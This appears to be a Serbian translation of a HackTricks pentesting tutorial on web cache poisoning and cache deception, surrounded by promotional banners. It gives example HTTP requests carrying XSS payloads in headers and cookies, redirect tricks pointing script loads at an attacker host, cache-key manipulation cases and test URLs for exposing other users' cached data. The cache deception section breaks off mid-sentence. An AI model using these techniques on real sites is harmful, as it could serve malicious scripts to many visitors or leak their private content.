# Trovanje keša i obmana keša

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Danas dobijte pristup:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Razlika

> **Koja je razlika između trovanja keša veb stranica i obmane keša veb stranica?**
>
> * U **trovanju keša veb stranica**, napadač uzrokuje da aplikacija sačuva zlonamerni sadržaj u kešu, a taj sadržaj se servira iz keša drugim korisnicima aplikacije.
> * U **obmani keša veb stranica**, napadač uzrokuje da aplikacija sačuva osetljiv sadržaj koji pripada drugom korisniku u kešu, a zatim napadač preuzima taj sadržaj iz keša.

## Trovanje keša

Trovanje keša ima za cilj manipulaciju kešem na strani klijenta kako bi se prisilili klijenti da učitaju resurse koji su neočekivani, delimični ili pod kontrolom napadača. Obim uticaja zavisi od popularnosti pogođene stranice, jer zagađeni odgovor se servira isključivo korisnicima koji posećuju stranicu tokom perioda kontaminacije keša.

Izvršenje napada trovanja keša uključuje nekoliko koraka:

1. **Identifikacija neindeksiranih ulaza**: To su parametri koji, iako nisu potrebni za keširanje zahteva, mogu promeniti odgovor koji server vraća. Identifikacija ovih ulaza je ključna jer se mogu iskoristiti za manipulaciju kešom.

2. **Iskorišćavanje neindeksiranih ulaza**: Nakon identifikacije neindeksiranih ulaza, sledeći korak je saznati kako iskoristiti ove parametre da se izmeni odgovor servera na način koji koristi napadaču.

3. **Osiguravanje da je zagađeni odgovor keširan**: Poslednji korak je osigurati da je manipulisani odgovor smešten u kešu. Na taj način, svaki korisnik koji pristupa pogođenoj stranici dok je keš zagađen će dobiti zagađeni odgovor.

### Otkrivanje: Provera HTTP zaglavlja

Obično, kada je odgovor **sačuvan u kešu**, postoji **zaglavlje koje to pokazuje**, možete proveriti na koja zaglavlja treba obratiti pažnju u ovom postu: [**HTTP zaglavlja keša**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Otkrivanje: Keširanje koda 400

Ako mislite da se odgovor čuva u kešu, možete pokušati **slati zahteve sa lošim zaglavljem**, na koje bi trebalo odgovoriti sa **status kodom 400**. Zatim pokušajte pristupiti zahtevu na uobičajen način i ako je **odgovor status kod 400**, znate da je ranjiv (i čak možete izvesti DoS napad).\
Loše konfigurisano zaglavlje može biti samo `\:` kao zaglavlje.\
Napomena da se ponekad ovi status kodovi ne keširaju, pa će ovaj test biti beskoristan.

### Otkrivanje: Identifikacija i procena neindeksiranih ulaza

Možete koristiti [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) da **brute-force parametre i zaglavlja** koja mogu **promeniti odgovor stranice**. Na primer, stranica može koristiti zaglavlje `X-Forwarded-For` da bi pokazala klijentu da učita skriptu odande:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Izazovite štetan odgovor sa serverske strane

Sa identifikovanim parametrom/headerom, proverite kako se on **sanitizuje** i **gde** se **reflektuje** ili utiče na odgovor iz headera. Možete li ga zloupotrebiti na bilo koji način (izvršiti XSS ili učitati JS kod koji kontrolišete? izvršiti DoS?...)

### Dohvatite keširani odgovor

Kada ste **identifikovali** **stranicu** koja može biti zloupotrebljena, koji **parametar**/**header** koristiti i **kako** ga zloupotrebiti, trebate dobiti keširanu stranicu. Zavisno od resursa koji pokušavate dobiti u kešu, to može potrajati neko vreme, možda ćete morati pokušavati nekoliko sekundi.\
Header **`X-Cache`** u odgovoru može biti vrlo koristan jer može imati vrednost **`miss`** kada zahtev nije keširan i vrednost **`hit`** kada je keširan.\
Header **`Cache-Control`** je takođe interesantan jer može otkriti da li se resurs kešira i kada će sledeći put resurs biti ponovo keširan: `Cache-Control: public, max-age=1800`\
Još jedan interesantan header je **`Vary`**. Ovaj header se često koristi da **ukazuje na dodatne headere** koji se tretiraju kao **deo ključa keša**, čak i ako obično nemaju ključ. Dakle, ako korisnik zna `User-Agent` žrtve koju cilja, može otrovati keš za korisnike koji koriste taj određeni `User-Agent`.\
Još jedan header koji se odnosi na keš je **`Age`**. Definiše vreme u sekundama koliko je objekat bio u kešu proxy servera.

Prilikom keširanja zahteva, **budite pažljivi sa headerima koje koristite**, jer neki od njih mogu biti **neočekivano korišćeni** kao **ključevi**, i žrtva će morati koristiti isti header. Uvek **testirajte** otrovavanje keša sa **različitim pregledačima** da biste proverili da li radi.

## Primeri iskorišćavanja

### Najjednostavniji primer

Header poput `X-Forwarded-For` se reflektuje u odgovoru bez sanitizacije.\
Možete poslati osnovni XSS payload i otrovati keš tako da će svako ko pristupi stranici biti izložen XSS napadu:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Napomena da će se ovim otrovati zahtev za `/en?region=uk`, a ne za `/en`_

### Korišćenje otrovanja keša veba za iskorišćavanje ranjivosti u rukovanju kolačićima

Kolačići takođe mogu biti reflektovani u odgovoru stranice. Ako to možete zloupotrebiti da izazovete XSS, na primer, možete iskoristiti XSS u nekoliko klijenata koji učitavaju zlonamerni keš odgovor.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Napomena da će, ako je ranjivi kolačić veoma korišćen od strane korisnika, redovni zahtevi čistiti keš.

### Korišćenje više zaglavlja za iskorišćavanje ranjivosti trovanja keša veb stranica <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Ponekad će vam biti potrebno **iskoristiti nekoliko neindeksiranih unosa** kako biste mogli zloupotrebiti keš. Na primer, možete pronaći **Otvoreno preusmeravanje** ako postavite `X-Forwarded-Host` na domen koji kontrolišete i `X-Forwarded-Scheme` na `http`. **Ako** je **server** **preusmeravao** sve **HTTP** zahteve **na HTTPS** i koristi zaglavlje `X-Forwarded-Scheme` kao ime domena za preusmeravanje. Možete kontrolisati gde je stranica usmerena preusmeravanjem.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Iskorišćavanje sa ograničenim `Vary` zaglavljem

Ako ste otkrili da se zaglavlje **`X-Host`** koristi kao **ime domena za učitavanje JS resursa**, ali **`Vary`** zaglavlje u odgovoru ukazuje na **`User-Agent`**, tada morate pronaći način da izvučete User-Agent žrtve i otrovate keš koristeći taj korisnički agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Iskorišćavanje HTTP Cache Trovanja zloupotrebom HTTP Request Smuggling-a

Saznajte ovde kako izvesti [napade Cache Trovanja zloupotrebom HTTP Request Smuggling-a](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automatizovano testiranje za Web Cache Trovanje

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) može se koristiti za automatsko testiranje web cache trovanja. Podržava mnoge različite tehnike i visoko je prilagodljiv.

Primer korišćenja: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ranjivi primeri

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS je prosleđivao fragment unutar URL-a bez uklanjanja i generisao ključ keša koristeći samo host, putanju i upit (ignorišući fragment). Tako je zahtev `/#/../?r=javascript:alert(1)` poslat na backend kao `/#/../?r=javascript:alert(1)` i ključ keša nije imao payload unutra, samo host, putanju i upit.

### GitHub CP-DoS

Slanje neispravne vrednosti u zaglavlju content-type izazvalo je keširan odgovor 405. Ključ keša je sadržao kolačić, pa je bilo moguće napadati samo neautorizovane korisnike.

### GitLab + GCP CP-DoS

GitLab koristi GCP kofere za skladištenje statičkog sadržaja. **GCP kofe** podržava **zaglavlje `x-http-method-override`**. Tako je bilo moguće poslati zaglavlje `x-http-method-override: HEAD` i otrovati keš tako da vrati prazno telo odgovora. Takođe je mogao podržavati metodu `PURGE`.

### Rack Middleware (Ruby on Rails)

U Ruby on Rails aplikacijama često se koristi Rack middleware. Svrha Rack koda je da uzme vrednost zaglavlja **`x-forwarded-scheme`** i postavi je kao šemu zahteva. Kada se pošalje zaglavlje `x-forwarded-scheme: http`, dolazi do preusmeravanja 301 na istu lokaciju, što može dovesti do DoS napada na tu resurs. Takođe, aplikacija može prihvatiti zaglavlje `X-forwarded-host` i preusmeriti korisnike na određeni host. Ovo ponašanje može dovesti do učitavanja JavaScript fajlova sa servera napadača, što predstavlja sigurnosni rizik.

### 403 i Storage Kofe

Cloudflare je ranije keširao 403 odgovore. Pokušaj pristupa S3 ili Azure Storage Blobs sa neispravnim Authorization zaglavljima rezultovao bi 403 odgovorom koji je bio keširan. Iako je Cloudflare prestao da kešira 403 odgovore, ovo ponašanje može biti prisutno u drugim proxy uslugama.

### Ubacivanje ključnih parametara

Keš često uključuje određene GET parametre u ključ keša. Na primer, Fastly-jev Varnish je keširao parametar `size` u zahtevima. Međutim, ako je URL-kodirana verzija parametra (npr. `siz%65`) takođe poslata sa pogrešnom vrednošću, ključ keša bi bio konstruisan koristeći ispravan parametar `size`. Međutim, backend bi obradio vrednost u URL-kodiranom parametru. URL-kodiranje drugog parametra `size` dovelo je do njegovog izostavljanja iz keša, ali njegove upotrebe od strane backend-a. Dodeljivanje vrednosti 0 ovom parametru rezultiralo je keširanim 400 Bad Request greškom.

### Pravila za korisnički agent

Neki programeri blokiraju zahteve sa korisničkim agentima koji se podudaraju sa onima visoko prometnih alata poput FFUF ili Nuclei kako bi upravljali opterećenjem servera. Ironično, ovaj pristup može dovesti do ranjivosti poput trovanja keša i DoS napada.

### Neispravna zaglavlja

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) definiše prihvatljive karaktere u nazivima zaglavlja. Zaglavlja koja sadrže karaktere van navedenog opsega **tchar** idealno bi trebala izazvati odgovor 400 Bad Request. U praksi, serveri se ne uvek pridržavaju ovog standarda. Značajan primer je Akamai, koji prosleđuje zaglavlja sa neispravnim karakterima i kešira svaku 400 grešku, sve dok zaglavlje `cache-control` nije prisutno. Identifikovan je iskoristiv obrazac gde slanje zaglavlja sa neispravnim karakterom, poput `\`, rezultuje keširanom 400 Bad Request greškom.

### Pronalaženje novih zaglavlja

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Trovanje Keša

Cilj trovanja keša je da natera klijente da **učitavaju resurse koji će biti sačuvani u kešu sa njihovim osetljivim informacijama**.

Pre svega, treba napomenuti da se **ekstenzije** poput `.css`, `.js`, `.png` obično **konfigurišu** da se **sačuvaju** u **kešu**. Dakle, ako pristupite `www.example.com/profile.php/nonexistent.js`, keš će verovatno sačuvati odgovor jer vidi **ekstenziju** `.js`. Ali, ako **aplikacija** ponavlja sa **osetljivim** sadržajem korisnika koji je sačuvan u _www.example.com/profile.php_, možete **ukrasti** taj sadržaj od drugih korisnika.

Drugi testovi koje treba izvršiti:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Koristite manje poznate ekstenzije poput_ `.avif`

Još jedan vrlo jasan primer može se naći u ovom write-up-u: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
U primeru je objašnjeno da ako učitate nepostojeću stranicu poput _http://www.example.com/home.php/non-existent.css_, sadržaj
<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
